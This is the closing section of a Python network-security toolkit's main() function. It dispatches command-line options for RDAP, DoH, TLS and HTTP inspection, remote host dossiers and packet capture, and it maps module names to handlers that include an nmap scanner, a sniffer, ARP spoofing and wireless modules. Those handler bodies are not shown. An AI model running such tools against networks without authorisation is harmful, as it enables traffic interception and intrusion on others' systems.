        summary = run_self_test(include_live=not args.no_live_tests, include_nmap=True)
        return session_shutdown(0 if summary["failed"] == 0 else 1)

    # --online-deps is a plain-HTTP freshness check (no raw sockets), so like
    # --self-test it runs before the privilege gate; the raw-socket one-shots
    # (--remote-dossier, --online-capture) stay behind the gate on purpose.
    if bool(getattr(args, "online_deps", False)):
        try:
            online_dependency_check()
        except Exception as exc:
            err("online dependency check failed: %s: %s" % (type(exc).__name__, exc))
            return session_shutdown(1)
        return session_shutdown(0)

    if str(getattr(args, "rdap", "") or "").strip():
        try:
            rdap_lookup(str(args.rdap).strip())
        except Exception as exc:
            err("RDAP lookup failed: %s: %s" % (type(exc).__name__, exc))
            return session_shutdown(1)
        return session_shutdown(0)

    if str(getattr(args, "doh", "") or "").strip():
        try:
            doh_query(str(args.doh).strip(),
                      qtype=str(getattr(args, "doh_type", "A") or "A"))
        except Exception as exc:
            err("DoH query failed: %s: %s" % (type(exc).__name__, exc))
            return session_shutdown(1)
        return session_shutdown(0)

    if str(getattr(args, "tls_inspect", "") or "").strip():
        try:
            tls_target = str(args.tls_inspect).strip()
            if tls_target.count(":") == 1 and tls_target.rsplit(":", 1)[1].isdigit():
                tls_host, tls_port_text = tls_target.rsplit(":", 1)
                tls_inspect(tls_host, int(tls_port_text))
            else:
                tls_inspect(tls_target)
        except Exception as exc:
            err("TLS inspection failed: %s: %s" % (type(exc).__name__, exc))
            return session_shutdown(1)
        return session_shutdown(0)

    if str(getattr(args, "http_inspect", "") or "").strip():
        try:
            http_inspect(str(args.http_inspect).strip())
        except Exception as exc:
            err("HTTP inspection failed: %s: %s" % (type(exc).__name__, exc))
            return session_shutdown(1)
        return session_shutdown(0)

    interactive = sys.stdin.isatty()
    if not startup_privilege_gate(bool(args.allow_unprivileged), interactive):
        return session_shutdown(3 if interactive else 4)

    if str(getattr(args, "remote_dossier", "") or "").strip():
        try:
            remote_host_dossier(str(args.remote_dossier).strip())
        except Exception as exc:
            err("remote dossier failed: %s: %s" % (type(exc).__name__, exc))
            return session_shutdown(1)
        return session_shutdown(0)

    if str(getattr(args, "online_capture", "") or "").strip():
        try:
            online_capture_analyse(iface=str(args.online_capture).strip(),
                                   duration=float(getattr(args, "capture_seconds", 20.0) or 20.0),
                                   bpf=str(getattr(args, "capture_filter", "") or ""))
        except Exception as exc:
            err("online capture failed: %s: %s" % (type(exc).__name__, exc))
            return session_shutdown(1)
        return session_shutdown(0)

    module_map: Dict[str, Callable] = {
        "icmp": module_icmp_recon,
        "tcp": module_tcp_crafter,
        "hping": module_hping,
        "nmap": module_nmap,
        "sniffer": module_sniffer,
        "arp-discovery": module_arp_discovery,
        "arp-spoof": module_arp_spoof,
        "pcap": module_pcap_analyst,
        "sysint": module_system_intel,
        "logs": module_logging_console,
        "doctor": module_dependency_doctor,
        "utils": module_network_utils,
        "dhcp": module_dhcp,
        "dns": module_dns,
        "wlan": module_wireless,
        "listeners": module_listeners,
        "extras": module_extras,
        "report": module_report,
    }
    if args.module and args.module not in ("menu", "self-test"):
        handler = module_map.get(str(args.module))
        if handler is None:
            err("unknown module '%s'." % args.module)
            return session_shutdown(2)
        LOGGER.event("module_start", "direct launch of module '%s'" % args.module)
        try:
            handler()
        except InputExhausted:
            warn("input stream closed - ending the module session cleanly.")
        except KeyboardInterrupt:
            warn("module interrupted by operator.")
        except Exception as exc:
            err("module failed: %s: %s" % (type(exc).__name__, exc))
            LOGGER.event("error", "direct module crash: %s" % exc, level="CRITICAL",
                         data={"traceback": traceback.format_exc()[-4000:]})
        return session_shutdown(0)

    if args.module == "self-test":
        summary = run_self_test(include_live=not args.no_live_tests, include_nmap=True)
        return session_shutdown(0 if summary["failed"] == 0 else 1)

    exit_code = 0
    try:
        exit_code = int(main_menu({"args": args}) or 0)
    except InputExhausted:
        out("")
        warn("input stream closed - closing the session.")
    except KeyboardInterrupt:
        out("")
        warn("interrupted at the menu - closing session cleanly.")
    except EOFError:
        out("")
        warn("input stream closed - closing session.")
    except Exception as exc:  # absolute last line of defence
        err("unhandled top-level failure: %s: %s" % (type(exc).__name__, exc))
        LOGGER.event("error", "top-level crash: %s" % exc, level="CRITICAL",
                     data={"traceback": traceback.format_exc()[-4000:]})
        exit_code = 1
    return session_shutdown(exit_code)


def _top_level_signal_handler(signum: int, frame: Any) -> None:
    """Convert SIGINT/SIGTERM into a clean shutdown with the journal flushed."""
    out("")
    warn("signal %s received - shutting down and flushing the session journal." % signum)
    try:
        if GLOBAL_LOGGER is not None:
            GLOBAL_LOGGER.event("session", "terminated by signal %s" % signum, level="WARN")
            GLOBAL_LOGGER.close()
    except Exception:
        pass
    raise SystemExit(130 if signum == getattr(signal, "SIGINT", 2) else 143)


# Module-level logger instance used by every module and by the decorators.
LOGGER = EventLogger(log_dir=DEFAULT_LOG_DIR)

if __name__ == "__main__":
    try:
        sys.exit(main())
    except SystemExit:
        atexit.unregister(LOGGER.close)
        raise
    except Exception as fatal:
        try:
            print("fatal startup error: %s: %s" % (type(fatal).__name__, fatal), file=sys.stderr)
        except Exception:
            pass
        sys.exit(1)
